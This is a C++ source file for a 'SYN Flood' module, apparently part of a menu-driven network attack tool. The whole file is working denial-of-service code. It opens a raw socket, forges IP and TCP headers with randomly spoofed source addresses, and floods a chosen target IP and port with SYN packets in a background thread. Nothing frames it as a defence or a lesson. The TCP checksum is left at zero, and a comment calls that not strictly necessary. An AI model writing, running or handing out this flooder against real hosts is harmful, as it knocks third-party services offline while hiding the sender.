#include "../headers/syn.h"

// Return the name of the attack for menu display
std::string SYN::get_name() {
    return "SYN Flood";
}

// Set module-specific options
void SYN::set_options(int port, int count) {
    this->target_port = port;
    this->packet_count = count;
}

// The main entry point to run the attack.
// It launches the attack logic in a separate thread.
void SYN::run(Session* session) {
    if (session->target_ip.empty()) {
        std::cerr << C_YELLOW << "Target IP is not set. Please configure it in the main menu." << C_RESET << std::endl;
        return;
    }
    stop_flag = false;
    // The syn_flood_loop is launched in a new thread
    // std::ref is used to pass the session->target_ip by reference
    attack_thread = std::thread(&SYN::syn_flood_loop, this, session->target_ip);
    //std::cout << C_BOLD << get_name() << " started..." << C_RESET << std::endl;
}

// Signals the attack thread to stop and waits for it to join.
void SYN::stop() {
    stop_flag = true;
    if (attack_thread.joinable()) {
        attack_thread.join();
    }
    //std::cout << get_name() << " stopped." << std::endl;
}

// Destructor ensures the thread is stopped and joined.
SYN::~SYN() {
    stop();
}

// The actual attack logic, designed to run in a loop.
void SYN::syn_flood_loop(std::string target_ip_str) {
    const char* target_ip = target_ip_str.c_str();

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    char packet[sizeof(iphdr) + sizeof(tcphdr)] = {0};
    iphdr* ip = (iphdr*)packet;
    tcphdr* tcp = (tcphdr*)(packet + sizeof(iphdr));

    long current_packet_count = 0;

    // The loop runs as long as stop_flag is false.
    // It also stops if packet_count is a positive value and the count is reached.
    while (!stop_flag) {
        std::string spoofed_ip = "192.168.1." + std::to_string(rand() % 255);
        inet_pton(AF_INET, spoofed_ip.c_str(), &ip->saddr);

        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(packet));
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->daddr = target_addr.sin_addr.s_addr;
        ip->check = checksum(ip, sizeof(iphdr));

        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(target_port);
        tcp->seq = rand();
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        tcp->check = 0; // Checksum will be calculated later, though not strictly necessary for this attack

        if (sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            perror("Failed to send packet");
        }

        current_packet_count++;
        if (packet_count > 0 && current_packet_count >= packet_count) {
            break; // Exit if the desired number of packets have been sent
        }
    }

    close(sock);
}

// Checksum calculation (remains unchanged)
unsigned short SYN::checksum(void* data, int len) {
    unsigned short* ptr = (unsigned short*)data;
    unsigned long sum = 0;
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len) sum += *(unsigned char*)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}
